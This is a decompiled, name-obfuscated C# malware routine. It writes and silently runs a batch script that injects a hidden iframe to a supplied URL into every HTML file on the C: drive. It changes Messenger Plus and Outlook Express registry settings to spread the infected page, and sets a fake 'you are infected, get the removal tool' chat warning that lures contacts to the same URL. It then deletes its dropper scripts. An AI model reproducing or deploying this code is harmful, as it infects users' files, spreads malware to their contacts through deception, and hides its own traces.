using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns1;

namespace ns2;

internal sealed class Class8
{
	public static void smethod_0(string string_0)
	{
		FileStream stream = new FileStream("C:\\windows\\system32\\launchz.bat", FileMode.Create, FileAccess.Write);
		StreamWriter streamWriter = new StreamWriter(stream);
		streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
		streamWriter.WriteLine("cd C:\\");
		streamWriter.WriteLine("dir /s /ad /b * >%windir%\\tmpp.log");
		streamWriter.WriteLine("for /f %%g in (%windir%\\tmpp.log) do (");
		streamWriter.WriteLine("echo ^<iframe src=\"" + string_0 + "\" height=0 width=0^> >>%%g\\*.html");
		streamWriter.WriteLine("echo ^<iframe src=\"" + string_0 + "\" height=0 width=0^> >>%%g\\*.htm");
		streamWriter.WriteLine(")");
		streamWriter.WriteLine("echo ^<iframe src=\"" + string_0 + "\" height=0 width=0^> >>%windir%\\system32.htm");
		streamWriter.WriteLine("reg add  \"HKEY_CURRENT_USER\\Software\\Patchou\\Messenger Plus! Live\\GlobalSettings\\Scripts\\MSN PLUS\" /v background /d %windir%\\system32.htm /f");
		streamWriter.WriteLine("reg add \"HKEY_CURRENT_USER\\Identities\\Software\\Microsoft\\Outlook Express\\5.0\\signatures\" /v \"Default Signature\" /d %windir%\\system32.htm/f");
		streamWriter.Close();
		try
		{
			((ServerComputer)Class2.smethod_0()).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\MessengerService\\Policies", "IMWarning", (object)("(M)Warning: The person who you are talking to is infected with a virus. Send him the removal tool that can be found in" + string_0));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		FileStream stream2 = new FileStream("C:\\windows\\system32\\launchz.vbs", FileMode.Create, FileAccess.Write);
		StreamWriter streamWriter2 = new StreamWriter(stream2);
		streamWriter2.BaseStream.Seek(0L, SeekOrigin.End);
		streamWriter2.WriteLine("Dim oShell");
		streamWriter2.WriteLine("Set oShell = WScript.CreateObject (\"WScript.Shell\")");
		streamWriter2.WriteLine("oShell.run \"C:\\windows\\system32\\launchz.bat\",0,True");
		streamWriter2.WriteLine("Set oShell = Nothing ");
		streamWriter2.Close();
		Process.Start("C:\\windows\\system32\\launchz.vbs");
		Class7.Sleep(10000L);
		FileInfo fileInfo = new FileInfo("C:\\windows\\system32\\launchz.vbs");
		fileInfo.Delete();
		FileInfo fileInfo2 = new FileInfo("C:\\windows\\system32\\launchz.bat");
		fileInfo2.Delete();
	}
}
